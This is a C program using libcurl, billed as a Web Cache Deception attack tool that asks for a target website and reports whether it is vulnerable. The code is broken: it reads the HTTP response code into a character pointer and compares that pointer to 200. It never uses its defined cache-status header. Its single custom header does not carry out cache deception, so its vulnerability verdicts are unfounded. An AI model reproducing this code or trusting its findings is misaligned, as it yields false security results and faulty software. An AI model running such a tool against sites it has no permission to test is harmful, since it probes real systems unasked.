#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <curl/curl.h>

// ANSI color escape codes
#define RED     "\033[1;31m"
#define GREEN   "\033[1;32m"
#define YELLOW  "\033[1;33m"
#define RESET   "\033[0m"

#define VULNERABLE_HEADER "X-Cache-Status: HIT"

// Function to perform a Web Cache Deception attack
void perform_deception(const char *target_url) {
    CURL *curl;
    CURLcode res;

    // Initialize libcurl
    curl = curl_easy_init();
    if (!curl) {
        fprintf(stderr, RED "Error initializing libcurl\n" RESET);
        exit(EXIT_FAILURE);
    }

    // Set the target URL for the Web Cache Deception attack
    curl_easy_setopt(curl, CURLOPT_URL, target_url);

    // Set custom request headers to manipulate caching behavior
    struct curl_slist *headers = NULL;
    headers = curl_slist_append(headers, "X-Ignore-Cache: true");
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

    // Perform the Web Cache Deception attack
    res = curl_easy_perform(curl);
    if (res != CURLE_OK) {
        fprintf(stderr, RED "Error performing Web Cache Deception attack: %s\n" RESET, curl_easy_strerror(res));
        curl_slist_free_all(headers);
        curl_easy_cleanup(curl);
        exit(EXIT_FAILURE);
    }

    // Cleanup libcurl
    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
}

// Function to check if the response indicates vulnerability
int check_vulnerability(const char *target_url) {
    CURL *curl;
    CURLcode res;
    int vulnerable = 0;

    // Initialize libcurl
    curl = curl_easy_init();
    if (!curl) {
        fprintf(stderr, RED "Error initializing libcurl\n" RESET);
        return -1;
    }

    // Set the target URL for fetching headers
    curl_easy_setopt(curl, CURLOPT_URL, target_url);

    // Set CURLOPT_NOBODY to fetch headers only
    curl_easy_setopt(curl, CURLOPT_NOBODY, 1L);

    // Perform the request
    res = curl_easy_perform(curl);
    if (res != CURLE_OK) {
        fprintf(stderr, RED "Error fetching headers: %s\n" RESET, curl_easy_strerror(res));
        curl_easy_cleanup(curl);
        return -1;
    }

    // Check for vulnerable header
    char *x_cache_status;
    res = curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &x_cache_status);
    if (res == CURLE_OK && x_cache_status == 200) {
        printf(YELLOW "Response indicates vulnerability.\n" RESET);
        vulnerable = 1;
    } else {
        printf(YELLOW "Response does not indicate vulnerability.\n" RESET);
    }

    // Cleanup libcurl
    curl_easy_cleanup(curl);

    return vulnerable;
}

int main() {
    char target_url[256];

    printf("Enter your target website: ");
    if (fgets(target_url, sizeof(target_url), stdin) == NULL) {
        fprintf(stderr, RED "Error reading target URL\n" RESET);
        return EXIT_FAILURE;
    }

    // Remove trailing newline character
    target_url[strcspn(target_url, "\n")] = 0;

    printf(GREEN "Starting Web Cache Deception attack on %s...\n" RESET, target_url);

    // Perform the Web Cache Deception attack
    perform_deception(target_url);

    // Check vulnerability
    if (check_vulnerability(target_url)) {
        printf(GREEN "The website is vulnerable to cache deception.\n" RESET);
        printf("To test the vulnerability, you can try manipulating cache headers and observe the server's response.\n");
    } else {
        printf(GREEN "The website is not vulnerable to cache deception.\n" RESET);
    }

    return 0;
}
